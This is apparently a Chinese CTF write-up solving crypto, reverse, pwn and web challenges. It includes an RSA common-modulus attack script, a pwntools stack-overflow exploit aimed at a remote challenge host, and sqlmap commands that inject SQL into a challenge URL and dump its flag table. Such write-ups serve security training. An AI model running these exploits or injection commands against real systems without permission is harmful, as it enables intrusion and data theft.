### Crypto

#### 签到题

```python
>>> int('666C61677B77656C636F6D655F746F5F6A6F696E5F7468655F4354465F20686176655F66756E7D', 16)
3338241147603897650971392632280291526687501593810213754210230295353296481602311402955937771133
>>> from libnum import *
>>> n2s(3338241147603897650971392632280291526687501593810213754210230295353296481602311402955937771133)
b'flag{welcome_to_join_the_CTF_ have_fun}'
```

------

#### rsa

```python
n1 = 12023886737570921683430494088148056717464277480371493354080633886982376602419433228186314817561301719123238737516332784081267153425832030515178119047675516911098595227477026283152544604891747727831780305507300318674027062554009254728767714650522432836286987070040177863862115871377017779058128916872854380528430193235920536818893053943407063308419618772087299760070707222914961338101044775521373972076936552277418325268112523349134412986872504187930360266568935217397303420305220796347316727211659529079762169876950534044014924448371804442314283893083178368082712851107281302456671010073505430574108861981588149293779
n2 = 12023886737570921683430494088148056717464277480371493354080633886982376602419433228186314817561301719123238737516332784081267153425832030515178119047675516911098595227477026283152544604891747727831780305507300318674027062554009254728767714650522432836286987070040177863862115871377017779058128916872854380528430193235920536818893053943407063308419618772087299760070707222914961338101044775521373972076936552277418325268112523349134412986872504187930360266568935217397303420305220796347316727211659529079762169876950534044014924448371804442314283893083178368082712851107281302456671010073505430574108861981588149293779
e1 = 2333
e2 = 23333
c1 = 1316116662134770690879814362103839780623420120527248536043840592146479052480574077985474161623763978563721124073172820410730492348846200098142706235343164470686127445583938273863894304189618247054649514955176136464273395879832878841555224421879457659795562326746943199675846414637238040550327393009642569894024250271081839428945999237716296592560124669418322569188493036148885333003876760965512925618500360394774816066758106739359762817644284120811162065280330204951295150904138010974815308787047834776406610525102814356091515999954110712767658162496023213125548829820563945272374105274832862682574678195529192009516
c2 = 6485241395763328009719746130709898541269729483150505308808259329749145687803066648274311801821624527910483266170666538736992203392620205417714840881369386852010836477498279266591695876758050686740322941452286584178315830797555697887040771666991377055060541491757349967338300117181859105577325308779010792879713808168285776399372981366988860647334022480774711504685240194804912592209253106123423232743785805952113875347267336118332317990496240807273787216894980604742600774512296661048914646776553393778079057461747246478299158814839681875752645552215714984659603917168300453505504140987829883479097467840565806608012
```

`n`相同，`e1`, `e2`和`c1`, `c2`不同，编写`Python`代码用共模攻击求解，得到`flag{01d80670b01b654fe4831a3e81870734}`。

```python
from libnum import *
from gmpy2 import gcdext

n1 = 12023886737570921683430494088148056717464277480371493354080633886982376602419433228186314817561301719123238737516332784081267153425832030515178119047675516911098595227477026283152544604891747727831780305507300318674027062554009254728767714650522432836286987070040177863862115871377017779058128916872854380528430193235920536818893053943407063308419618772087299760070707222914961338101044775521373972076936552277418325268112523349134412986872504187930360266568935217397303420305220796347316727211659529079762169876950534044014924448371804442314283893083178368082712851107281302456671010073505430574108861981588149293779
n2 = 12023886737570921683430494088148056717464277480371493354080633886982376602419433228186314817561301719123238737516332784081267153425832030515178119047675516911098595227477026283152544604891747727831780305507300318674027062554009254728767714650522432836286987070040177863862115871377017779058128916872854380528430193235920536818893053943407063308419618772087299760070707222914961338101044775521373972076936552277418325268112523349134412986872504187930360266568935217397303420305220796347316727211659529079762169876950534044014924448371804442314283893083178368082712851107281302456671010073505430574108861981588149293779
e1 = 2333
e2 = 23333
c1 = 1316116662134770690879814362103839780623420120527248536043840592146479052480574077985474161623763978563721124073172820410730492348846200098142706235343164470686127445583938273863894304189618247054649514955176136464273395879832878841555224421879457659795562326746943199675846414637238040550327393009642569894024250271081839428945999237716296592560124669418322569188493036148885333003876760965512925618500360394774816066758106739359762817644284120811162065280330204951295150904138010974815308787047834776406610525102814356091515999954110712767658162496023213125548829820563945272374105274832862682574678195529192009516
c2 = 6485241395763328009719746130709898541269729483150505308808259329749145687803066648274311801821624527910483266170666538736992203392620205417714840881369386852010836477498279266591695876758050686740322941452286584178315830797555697887040771666991377055060541491757349967338300117181859105577325308779010792879713808168285776399372981366988860647334022480774711504685240194804912592209253106123423232743785805952113875347267336118332317990496240807273787216894980604742600774512296661048914646776553393778079057461747246478299158814839681875752645552215714984659603917168300453505504140987829883479097467840565806608012

def rsa_common_N(e1, e2, c1, c2, n):
    print("e1,e2:", e1, e2)
    print(gcd(e1, e2))
    if gcd(e1, e2):
        s = gcdext(e1, e2)
        s1 = s[1]
        s2 = s[2]
        if s1 < 0:
            s1 = - s1
            c1 = invmod(c1, n)
        elif s2 < 0:
            s2 = - s2
            c2 = invmod(c2, n)
        m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
        return int(m)
    else:
        print("e1,e2不互质")

m = rsa_common_N(e1, e2, c1, c2, n1)
flag = n2s(m).decode()
print(flag)  # flag{01d80670b01b654fe4831a3e81870734}
```

------

#### base谁是多余者

亮哥提示的`hint`：保留`base32`以外的字符:`A-Z`, `2-7`，`base32`解码再`base64`解码。

```python
from base64 import *

a = 'LJWXQ2C2GN2HGYRSHFZFQM3ENneed5RDCOLQMMYTS5LCGNJGMYTNKZWFURRZOBRGYOLNMJDUM3TGKE6T2==='
s = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
flag = ''
for i in range(len(a)):
    if a[i] in s:
        flag += a[i]
# LJWXQ2C2GN2HGYRSHFZFQM3EN5RDCOLQMMYTS5LCGNJGMYTNKZWFURRZOBRGYOLNMJDUM3TGKE6T2===
flag = b32decode(flag+'===').decode()  # ZmxhZ3tsb29rX3dob19pc19ub3RfbmVlZF9pbl9mbGFnfQ==
flag = b64decode(flag).decode()
print(flag)  # flag{look_who_is_not_need_in_flag}
```

------

### Reverse

#### re1

```python
flag = ''
s = 'aqlipcrwjcrkmp]{mw]imv]oc'
for i in range(len(s)):
    if (i & 1) != 0:
        flag += chr(ord(s[i])-2)
    else:
        flag += chr(ord(s[i])+2)
flag = f'flag{{{flag}}}'
print(flag)  # flag{congratulation_you_got_me}
```

#### re2

```python
flag = ''
s = [114, 96, 103, 103, 90, 90, 101, 100, 91, 85, 88, 96, 96, 85, 18]
a = [5, 5, 5, 5, 5, 10, 10, 10, 10, 10, 15, 15, 15, 15, 15]
for i in range(len(s)):
    # flag += chr(s[i] + a[i])
    flag += chr(s[i] + 5*(1+i//(5)))

flag = f'flag{{{flag}}}'
print(flag)
```

#### re3

```bash
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ file ./re3
./re3: POSIX tar archive
                                                                                                            
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ tar -xvf re3
._flag.txt
flag.txt
                                                                                                            
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ cat flag.txt
CTF{S1MDf0rM3!}
```

#### re4

```java
paramView = "dd2940c04462b4dd7c450528835cca15".toCharArray();
paramView[2] = ((char)(char)(paramView[2] + paramView[3] - 50));
paramView[4] = ((char)(char)(paramView[2] + paramView[5] - 48));
paramView[30] = ((char)(char)(paramView[31] + paramView[9] - 48));
paramView[14] = ((char)(char)(paramView[27] + paramView[28] - 97));
i = 0;
if (i >= 16)
{
  paramView = String.valueOf(paramView);
  this.val$textview.setText("flag{" + paramView + "}");
}
```

最后记得逆序。

```python
s = "dd2940c04462b4dd7c450528835cca15"
l = list(s)
l[2] = chr(ord(l[2])+ord(l[3])-50)
l[4] = chr(ord(l[2])+ord(l[5])-48)
l[30] = chr(ord(l[31])+ord(l[9])-48)
l[14] = chr(ord(l[27])+ord(l[28])-97)
flag = ''.join(l)[::-1]
flag = f'flag{{{flag}}}'
print(flag)  # flag{59acc538825054c7de4b26440c0999dd}
```

------

### Pwn

#### babystack

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('tanyaodan.com', 10000)
elf = ELF('./babystack')
backdoor = elf.symbols['backdoor'] # 0x40124a
payload = b'a'*0x28 + p64(backdoor)
io.sendlineafter("Tell me what's your name?\n", payload)
io.interactive()
```

#### calculate

```python
from pwn import *

def cal(x, y, opertor):
    if opertor == '+':
        return x+y
    elif opertor == '-':
        return x-y
    elif opertor == 'x':
        return x*y
    elif opertor == '/':
        return x/y
    else:
        return 0

context(arch='amd64', os='linux', log_level='debug')
io = remote('tanyaodan.com', 10001)
for i in range(100):
    io.recvuntil(b"What is ")
    n1 = int(io.recvuntil(b' '))
    oper = io.recvuntil(b' ')[:-1].decode()
    n2 = int(io.recvuntil(b'?')[:-1])
    n = cal(n1, n2, oper)
    io.recvuntil('Input Answer: ')
    io.sendline(str(n).encode())
    log.success('%d %c %d = %s' % (n1, oper, n2, str(n)))

io.interactive()
```

### Web

#### babysql

```bash
┌──(tyd㉿kali-linux)-[~/ctf]
└─$ sqlmap -u "http://43.143.226.7:4002?id=1" --current-db
[14:27:21] [INFO] fetching current database
current database: 'f14g'

┌──(tyd㉿kali-linux)-[~/ctf]
└─$ sqlmap -u "http://43.143.226.7:4002?id=1" -D f14g --tables
[14:28:15] [INFO] fetching tables for database: 'f14g'
[14:28:15] [INFO] retrieved: 'Flag666'
[14:28:15] [INFO] retrieved: 'passage'
Database: f14g                                                                                               
[2 tables]
+---------+
| Flag666 |
| passage |
+---------+

┌──(tyd㉿kali-linux)-[~/ctf]
└─$ sqlmap -u "http://43.143.226.7:4002?id=1" -D f14g -T Flag666 --columns
[14:29:03] [INFO] fetching columns for table 'Flag666' in database 'f14g'
Database: f14g
Table: Flag666
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(256) |
+--------+--------------+

┌──(tyd㉿kali-linux)-[~/ctf]
└─$ sqlmap -u "http://43.143.226.7:4002?id=1" -D f14g -T Flag666 -C flag --dump
[14:29:32] [INFO] fetching entries of column(s) 'flag' for table 'Flag666' in database 'f14g'
Database: f14g
Table: Flag666
[1 entry]
+-----------------------+
| flag                  |
+-----------------------+
| flag{e4sy_union_sql!} |
+-----------------------+
```

------
